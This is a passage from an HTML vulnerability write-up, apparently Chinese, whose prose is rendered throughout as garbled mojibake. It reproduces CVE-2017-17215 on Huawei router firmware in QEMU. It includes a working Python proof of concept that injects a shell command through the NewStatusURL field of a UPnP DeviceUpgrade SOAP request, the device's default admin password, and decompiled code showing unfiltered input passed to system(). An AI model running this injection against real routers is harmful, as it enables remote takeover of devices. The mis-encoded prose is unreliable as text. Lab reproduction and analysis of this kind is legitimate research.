./bin/busybox</code>çš„æŒ‡ä»¤å³å¯å¾—åˆ°ç›¸åº”çš„æ–‡ä»¶æ¶æ„ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> ./bin/busybox./bin/busybox: ELF <span class="token number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>è‡³æ­¤Binwalkå®‰è£…å®Œæ¯•ã€‚</p><h3 id="Qemuå®‰è£…"><a class="header-anchor" href="#Qemuå®‰è£…">Â¶</a>Qemuå®‰è£…</h3><p>ç›¸å¯¹äºBinwalkçš„æ‰‹åŠ¨ç¼–è¯‘ï¼ŒQemuç›¸å¯¹ç®€å•ä¸€ç‚¹ï¼Œç¨å¾®æœ‰æ‰€äº†è§£çš„åŒå¿—å¯èƒ½ä¼šçŸ¥é“Qemuæœ‰ç³»ç»Ÿå’Œç”¨æˆ·æ¨¡å¼ä¸¤ç§ã€‚å®‰è£…çš„è¯å¯ä»¥é€‰æ‹©ä¸åŒçš„éœ€æ±‚å®‰è£…ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©å…¨éƒ¨éƒ½å®‰è£…ã€‚</p><p>Qemuçš„å®‰è£…æ²¡æœ‰å¾ˆå¤šè®²ç©¶ï¼Œä¸€é”®è„šæœ¬å®‰è£…å³å¯</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://git.qemu.org/qemu.git<span class="token builtin class-name">cd</span> qemu<span class="token function">git</span> submodule init<span class="token function">git</span> submodule update --recursivesudo<span class="token function">apt</span> <span class="token function">install</span> libglib2.0 libglib2.0-devsudo<span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtoolcd qemu <span class="token operator">&amp;&amp;</span> ./configuremakesudo <span class="token function">make</span> <span class="token function">install</span>//apt å®‰è£…<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user-static<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®‰è£…å®Œæ¯•ä¹‹åï¼Œå¦‚ä¸‹å›¾<br><img src="https://i.bmp.ovh/imgs/2022/01/d4c999e08069c699.png" alt=""></p><h2 id="0x02-æ¼æ´éªŒè¯"><a class="header-anchor" href="#0x02-æ¼æ´éªŒè¯">Â¶</a>0x02 æ¼æ´éªŒè¯</h2><p>å·¥å…·å®‰è£…å®Œæ¯•ä¹‹åï¼Œä»¥ä¸‹å°†å¯¹æ¼æ´è¿›è¡ŒéªŒè¯ã€‚</p><h3 id="å¯åŠ¨æœåŠ¡"><a class="header-anchor" href="#å¯åŠ¨æœåŠ¡">Â¶</a>å¯åŠ¨æœåŠ¡</h3><p>é¦–å…ˆï¼Œéœ€è¦ç»™Qemuè™šæ‹Ÿæœºå‡†å¤‡ä¸€ä¸ªæ–°çš„ç½‘æ¡¥ï¼Œåˆ©ç”¨è¯¥ç½‘æ¡¥ä½¿å¾—Qemuæœºå¯ä»¥è”é€šäº’è”ç½‘ï¼Œå¹¶ä¸”å’ŒVMè™šæ‹Ÿæœºå¤„äºåŒä¸€ç½‘æ®µã€‚</p><p>é‡‡ç”¨çš„åŸºæœ¬æ–¹æ³•æ˜¯åˆ†é…ä¸€ä¸ªæ–°ç½‘å¡ç»™Qemuæœºå™¨ï¼Œå¹¶ä¸”ä½¿ç”¨ç½‘æ¡¥ï¼Œå°†å…¶æ¡¥æ¥åˆ°åŸæ¥çš„ç½‘å¡ã€‚é¦–å…ˆéœ€è¦å®‰è£…ç½‘æ¡¥é…ç½®å·¥å…·ã€‚</p><p><code>apt-get install bridge-utils</code><br><code>sudo apt-get install uml-utilities </code></p><p>ç„¶åä½¿ç”¨ä¸‹é¢çš„è„šæœ¬å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span><span class="token function">sudo</span> brctl addbr br0 //åˆ›å»ºç½‘æ¡¥br0<span class="token function">sudo</span> brctl addif br0 ens33 //è¿æ¥åˆ°ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> <span class="token function">ifconfig</span> ens33 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> dhclient br0//ç»™è¯¥ç½‘æ¡¥åˆ†é…IPåœ°å€ï¼Œæ­¤å‰ä¸èƒ½ç»™ens33åˆ†é…ipv4çš„åœ°å€<span class="token function">sudo</span> tunctl -t tap0 -u root<span class="token function">sudo</span> brctl addif br0 tap0<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> brctl showstp br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä»¥ä¸Šå†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªbashè„šæœ¬å³å¯ï¼Œå¼€å¯è™šæ‹Ÿæœºä¹‹å‰è¿è¡Œä¸€éã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/17975a3eca5dd634.png" alt=""></p><p>ç½‘ç»œé…ç½®å¥½äº†ä¹‹åï¼Œä½¿ç”¨ç›¸åº”çš„é•œåƒå’Œå†…æ ¸æ–‡ä»¶å¯åŠ¨ä¸€ä¸ªqemuæœºã€‚<br><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a><br>ä»¥ä¸Šç½‘å€å¯ä»¥ä¸‹è½½å†…æ ¸å’Œé•œåƒã€‚</p><p>æœŸå¾…ä½¿ç”¨æŒ‡å®šçš„ç½‘æ¡¥ï¼Œä¸”åœ¨å½“å‰ä¸­æ–­å¼€å¯qemuæœºå™¨ã€‚<br><code>sudo qemu-system-mips -M malta -kernel ~/Desktop/IOT/vmlinuxs/vmlinux-2.6.32-5-4kc-malta -hda ~/Desktop/IOT/Images/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</code></p><p>æŒ‡ä»¤çš„å…·ä½“å«ä¹‰å¯ä»¥çœ‹ä»¥ä¸‹Qemuçš„è¯´æ˜æ–‡æ¡£ã€‚<a href="https://wiki.archlinux.org/title/QEMU_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/QEMU_(ç®€ä½“ä¸­æ–‡)</a></p><p>è™šæ‹Ÿæœºçš„rootè´¦æˆ·å¯†ç æ˜¯rootï¼ŒæˆåŠŸç™»å½•ä¹‹åï¼Œå°è¯•pingä»¥ä¸‹å¤–ç½‘ï¼Œçœ‹èƒ½å¦pingé€šã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/2b3815aba7ca25ec.png" alt=""></p><p>ç„¶åä½¿ç”¨scpæŒ‡ä»¤ï¼ŒæŠŠæ–‡ä»¶ç³»ç»Ÿéƒ½ä¼ é€’ç»™Qemuè™šæ‹Ÿæœºã€‚<br><code>scp -r è·¯å¾„ ip@username:è™šæ‹Ÿæœºè·¯å¾„</code><br><code>$ scp -r squashfs-root  root@192.168.146.137:~/sqashfs-root</code></p><p>æ–‡ä»¶ä¼ è¾“å®Œæ¯•ä¹‹åï¼Œä¸ºäº†èƒ½å¤Ÿè®©VMæœºè®¿é—®åˆ°Qemuæœºï¼Œä½¿ç”¨mountæŒ‚è½½ä»¥ä¸‹devå’Œproc</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> -o <span class="token builtin class-name">bind</span> /dev ./squashfs-root/dev<span class="token function">mount</span> -t proc /proc ./squashfs-root/proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿæœ‰ä¸åŒçš„æŒ‚è½½æŒ‡ä»¤ã€‚</p><p>æ­¤æ—¶æ³¨æ„åˆ°<code>CVE-2017-17215</code>çš„æ¼æ´å­˜åœ¨äº<code>upnpå’Œmic</code>æœåŠ¡ä¸­ã€‚è¿™ä¸¤é¡¹æœåŠ¡éƒ½å’Œç½‘ç»œæœ‰å…³ï¼Œä¸ºäº†æ–¹å¼æ¼æ´æœåŠ¡å¯åŠ¨åï¼Œç½‘ç»œç¯å¢ƒçš„å˜åŒ–ï¼Œä½¿ç”¨sshè¿œç¨‹ç™»å½•è¯¥Qemuæœºå™¨ï¼Œæ–°å»ºä¸€ä¸ªconsoleï¼Œåˆ©ç”¨è¯¥consoleå¯åŠ¨æ¼æ´æœåŠ¡ï¼Œåˆ©ç”¨åŸæœ‰çš„Qemuçª—å£ä¿æŒQemuçš„ipä¸å‘ç”Ÿæ”¹å˜ã€‚</p><p>åœ¨sshçª—å£è¾“å…¥<code>chroot . /bin/sh</code>æ›´æ”¹æ ¹ç›®å½•ï¼Œé¿å…åŠ¨æ€é“¾æ¥åº“æŠ¥é”™ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/b47cbc250d9e899d.png" alt=""></p><p>ç„¶åæ‰§è¡Œæ¼æ´æœåŠ¡å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ./bin/upnp</span><span class="token comment"># ./bin/mic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>ç­‰å¾…æ‰§è¡Œç»“æŸï¼Œæœç„¶ipå‘ç”Ÿäº†æ”¹å˜ï¼Œåˆ©ç”¨ifconfigæŒ‡ä»¤æŠŠipåœ°å€æ”¹å›å»ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/a4a0a7d9ee1cb49f.png" alt=""></p><p>æ­¤æ—¶ï¼Œå°è¯•è®¿é—®è¯¥è·¯ç”±å™¨ï¼ˆQemuæœºï¼‰çš„ipåœ°å€ï¼Œå¯ä»¥å‘ç°æˆåŠŸè®¿é—®ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/f329dee4d718e098.png" alt=""></p><p>é»˜è®¤è´¦æˆ·adminï¼Œ@Hua1234</p><h3 id="pocæµ‹è¯•"><a class="header-anchor" href="#pocæµ‹è¯•">Â¶</a>pocæµ‹è¯•</h3><p>æ¼æ´æœåŠ¡å¼€å¯ä¹‹åï¼Œå¯ä»¥éªŒè¯ä»¥ä¸‹æ¼æ´çš„pocï¼Œç”¨çš„æ˜¯ä¸‹é¢çš„exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?xml version="1.0" ?> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  &lt;s:Body>&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">   &lt;NewStatusURL>;/bin/busybox mkdir shell;&lt;/NewStatusURL>   &lt;NewDownloadURL>HUAWEIUPNP&lt;/NewDownloadURL>  &lt;/u:Upgrade> &lt;/s:Body>&lt;/s:Envelope>'''</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.146.137:37215/ctrlt/DeviceUpgrade_1'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>postè¯·æ±‚çš„IPåœ°å€å†™Qemuæœºçš„IPåœ°å€ã€‚æ‰§è¡Œåï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://i.bmp.ovh/imgs/2022/01/ce55e82d38946b38.png" alt=""><br>æˆåŠŸrceã€‚</p><h2 id="0x03-æ¼æ´åˆ†æ"><a class="header-anchor" href="#0x03-æ¼æ´åˆ†æ">Â¶</a>0x03 æ¼æ´åˆ†æ</h2><p>æ¼æ´ç¯å¢ƒå’ŒæœåŠ¡éƒ½å·²æ­å»ºæˆåŠŸï¼Œå¹¶ä¸”å·²ç»æˆåŠŸéªŒè¯ã€‚æ¥ä¸‹æ¥ç»“åˆå›ºä»¶åˆ†ææ›´åŠ æ·±å…¥ç†è§£è¯¥æ¼æ´çš„æˆå› ã€‚</p><h3 id="åˆ†ææ¼æ´å‡½æ•°"><a class="header-anchor" href="#åˆ†ææ¼æ´å‡½æ•°">Â¶</a>åˆ†ææ¼æ´å‡½æ•°</h3><p>é¦–å…ˆï¼Œä½¿ç”¨Ghidraæ‰“å¼€upnpæ–‡ä»¶ã€‚ç”±pocä¸éš¾å‘ç°ï¼Œæ³¨å…¥å‘½ä»¤çš„ä½ç½®å‡ºç°åœ¨<code>&lt;NewStatusURL&gt;</code>èŠ‚ç‚¹ä»¥å†…ã€‚æ‰€ä»¥å…ˆå°è¯•æœç´¢è¯¥å­—ç¬¦ä¸²ã€‚</p><p>åœ¨å­—ç¬¦ä¸²æœç´¢æ¡†æœç´¢ï¼Œ<code>NewStatusURL</code>,çš„åˆ°å¦‚ä¸‹å‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0040749c</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_418<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_414<span class="token punctuation">;</span>  <span class="token keyword">char</span> acStack1040 <span class="token punctuation">[</span><span class="token number">1028</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewDownloadURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_418<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_418 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span>                        <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewStatusURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_414<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_414 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">snprintf</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b"</span><span class="token punctuation">,</span>               local_418<span class="token punctuation">,</span>local_414<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®¹æ˜“å‘ç°systemå‡½æ•°çš„å‚æ•°æ¥æºäº<code>snprintf</code>ï¼Œå†çœ‹snprintfå‡½æ•°ä¸­ï¼Œå‚æ•°çš„æ‹¼æ¥ç”¨çš„æ˜¯å­—ç¬¦ä¸²<code>%s</code>ä¼ å…¥ï¼Œæ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤å¤„ç†ï¼Œç”±æ­¤å¯ä»¥åˆ¤æ–­ï¼Œè¿™æ˜¯ç”±<code>snprintf</code>å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼å¼•èµ·çš„ï¼Œå‘½ä»¤æ‹¼æ¥RCE.</p><p>å°è¯•æŸ¥çœ‹è¯¥å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œå‘ç°å¤±è´¥ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/e3aa953461727c2d.png" alt=""><br>è¿™è¯´æ˜è¯¥å‡½æ•°æ˜¯è¢«é—´æ¥è°ƒç”¨çš„ï¼Œç›®å‰ä¸ºæ­¢ï¼Œç¬”è€…åªèƒ½æƒ³åˆ°ï¼Œè¯¥å‡½æ•°æ˜¯ç”±è™šå‡½æ•°è¡¨è°ƒç”¨ï¼ˆæ¯”è¾ƒå¸¸è§ï¼‰</p><p>å¯»æ‰¾è¯¥å‡½æ•°çš„è°ƒç”¨åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ— æ³•å‰è¿›ï¼Œä½†æ˜¯æ¼æ´çš„æˆå› æ‰¾åˆ°äº†ã€‚</p><h3 id="æ¼æ´è§¦å‘æµç¨‹"><a class="header-anchor" href="#æ¼æ´è§¦å‘æµç¨‹">Â¶</a>æ¼æ´è§¦å‘æµç¨‹</h3><p>åˆšæ‰æˆ‘ä»¬å°è¯•ä»æ¼æ´å‡½æ•°çš„è°ƒç”¨å»å¯»æ‰¾æ¼æ´çš„è§¦å‘ç‚¹ï¼Œå¤±è´¥äº†ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œæ­£å‘çš„å»å¯»æ‰¾æ¼æ´çš„è§¦å‘ç‚¹ã€‚è¿›å…¥æ–‡ä»¶ç³»ç»Ÿï¼Œå°è¯•æœç´¢ï¼Œè¯¥å­—ç¬¦ä¸²åœ¨å“ªé‡Œå‡ºç°äº†ã€‚<code>grep -r &quot;NewStatusURL&quot;</code></p><p><img src="https://i.bmp.ovh/imgs/2022/01/d2e4c615c810c54f.png" alt=""><br>åœ¨upnpçš„æ–‡ä»¶å¤¹ä¸‹é¢å‘ç°äº†ä»…æœ‰<code>DevUpg.xml</code>ä¸­æœ‰è¯¥å­—ç¬¦ä¸²ã€‚ï¼ˆè¯´æ˜åªæœ‰è¯¥åœ°æ–¹ç”¨åˆ°äº†è¯¥å­—ç¬¦ä¸²ï¼‰</p><p>è€æ ·å­ï¼Œåœ¨Ghidraä¸­æœç´¢<code>DevUpg.xml</code>å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°ä¸€ä¸ªæœåŠ¡æ³¨å†Œå‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ATP_UPNP_RegDeviceAndService</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar3<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar6<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar7<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar8<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar9<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar10<span class="token punctuation">;</span>  undefined4 local_128<span class="token punctuation">;</span>  undefined4 local_124<span class="token punctuation">;</span>  undefined4 local_120<span class="token punctuation">;</span>  undefined4 local_11c<span class="token punctuation">;</span>  undefined4 local_118<span class="token punctuation">;</span>  undefined4 local_114<span class="token punctuation">;</span>  undefined4 local_110<span class="token punctuation">;</span>  undefined4 local_10c<span class="token punctuation">;</span>  undefined4 local_108<span class="token punctuation">;</span>  undefined4 local_104<span class="token punctuation">;</span>  undefined4 local_100<span class="token punctuation">;</span>  undefined4 local_fc<span class="token punctuation">;</span>  undefined4 local_f8<span class="token punctuation">;</span>  undefined4 local_f4<span class="token punctuation">;</span>  undefined4 local_f0 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_dc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_cc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_bc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_ac<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_9c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_98<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_94<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_90<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_8c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_88<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_84<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_80<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_7c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_78<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_74<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_70<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_6c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_68<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_64<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_60<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_5c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_58<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_54<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_50<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_4c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_48<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_44<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_40<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_3c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_38<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_34<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_30<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_2c<span class="token punctuation">;</span>    local_128 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_124 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_120 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_11c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_118 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_114 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_110 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_10c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_108 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_104 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_100 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_fc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>g_stDevDesc<span class="token punctuation">.</span>_4_4_<span class="token punctuation">,</span><span class="token string">"InternetGatewayDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_128<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceUpgrade:1"</span><span class="token punctuation">,</span><span class="token string">"DevUpg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>                              <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_124<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"Layer3Forwarding:1"</span><span class="token punctuation">,</span><span class="token string">"L3Fwd.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_120<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"LANConfigSecurity:1"</span><span class="token punctuation">,</span><span class="token string">"LANSec.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_118<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"DevCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span>                              <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_11c<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token 